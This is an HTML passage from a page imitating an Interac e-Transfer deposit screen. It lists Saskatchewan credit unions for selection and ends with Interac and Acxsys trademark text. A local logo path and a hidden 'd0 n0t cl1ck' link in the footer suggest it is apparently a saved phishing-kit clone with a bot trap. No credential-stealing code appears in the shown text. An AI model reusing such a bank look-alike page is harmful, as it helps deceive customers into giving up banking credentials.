											Luseland Credit Union
										</option>
										<option value="818892850">
											Macklin Credit Union
										</option>
										<option value="818893130">
											NEW COMMUNITY CREDIT UNION
										</option>
										<option value="818892070">
											North Valley Credit Union
										</option>
										<option value="818893320">
											Pierceland Credit Union
										</option>
										<option value="818892640">
											Plainsview Credit Union
										</option>
										<option value="818894930">
											Porcupine Credit Union
										</option>
										<option value="818892450">
											Prairie Centre Credit Union
										</option>
										<option value="818891070">
											Prairie Pride Credit Union
										</option>
										<option value="818891780">
											Radius Credit Union
										</option>
										<option value="818893380">
											Raymore Credit Union
										</option>
										<option value="818893490">
											Rockglen-Killdeer Credit Union Limited
										</option>
										<option value="818892780">
											Sandhills Credit Union
										</option>
										<option value="818893540">
											Saskatoon City Employees Credit Union
										</option>
										<option value="818893680">
											Spiritwood Credit Union
										</option>
										<option value="818893750">
											St. Gregor Credit Union
										</option>
										<option value="818893820">
											Stoughton Credit Union
										</option>
										<option value="818891650">
											Synergy Credit Union
										</option>
										<option value="818890710">
											TCU Financial Group
										</option>
										<option value="818893920">
											Turtleford Credit Union
										</option>
										<option value="818891750">
											Unity Credit Union Limited
										</option>
										<option value="818890810">
											Weyburn Credit Union
										</option>
									</select>
									<span id="selectCu-hintlabel-SK" class="hint-label">
										Select a Credit Union from the list above
									</span>
								</div>
								<div class="selectCu" style="display: none;">
									<label id="selectCu-title-YT" for="selectCu-YT">
										Select Credit Union
									</label>
									<select id="selectCu-YT" name="selectCuId" data-role="none">
										<option selected="selected" value="">
											Select Credit Union
										</option>
									</select>
									<span id="selectCu-hintlabel-YT" class="hint-label">
										Select a Credit Union from the list above
									</span>
								</div>
							</div>
						</div>
					</div>
					<div class="pure-u-1 text-center">
						<button id="depositSelectSubmit" class="pure-button button-brand-a deposit-form-submit-btn fi-select-submit cu-select-submit" disabled="disabled" type="button" data-role="none">
							 Deposit &gt;
						</button>
					</div>
				</div>
			</form>
		</div>
	</div>
	<div class="footer l-box interac-max-width ui-footer ui-bar-inherit" data-role="footer">
		<div class="pure-g footer-link-container">
			<div class="pure-u-lg-1-4 pure-u-md-1-2 pure-u-1">
				<a class="certapay-link footer-link ui-link" data-ajax="false">
					<em>
						Interac
					</em>
					 e-Transfer
				</a>
			</div>
			<div class="pure-u-lg-1-4 pure-u-md-1-2 pure-u-1">
				<a class="privacy-link footer-link ui-link" data-ajax="false">
					Privacy Policy
				</a>
			</div>
			<div class="pure-u-lg-1-4 pure-u-md-1-2 pure-u-1">
				<a class="security-link footer-link ui-link" data-ajax="false">
					Security
				</a>
			</div>
			<div class="pure-u-lg-1-4 pure-u-md-1-2 pure-u-1">
				<span class="footer-text">
					 This is a secure Transaction
				</span>
			</div>
		</div>
		<div class="padding-t-5 pure-g">
			<div class="pure-u-md-1-2 pure-hidden-sm pure-hidden-xs text-left">
				<img class="logo" style="max-height: 50px; margin-left: 8px;" src="./files/svg/etransfer_logo.svg" alt="" />
			</div>
			<div class="pure-u-1 pure-hidden-md pure-hidden-lg pure-hidden-xl">
				<img class="logo" style="max-height: 50px;" src="./files/svg/etransfer_logo.svg" alt="" />
			</div>
			<div class="pure-u-md-1-2 pure-u-1">
				<p class="copyright-text">
					<a style="display: none;" href="not-found">
						d0 n0t cl1ck
					</a>
					 &copy; 2000 &mdash; 2023 Acxsys Corporation. All rights reserved.
					<a class="termsAndConditions-link underline ui-link">
						Terms of Use
					</a>
					<br />
					 &reg; Trade-Mark of Interac Inc. Used under licence
				</p>
			</div>
		</div>
	</div>
</div>
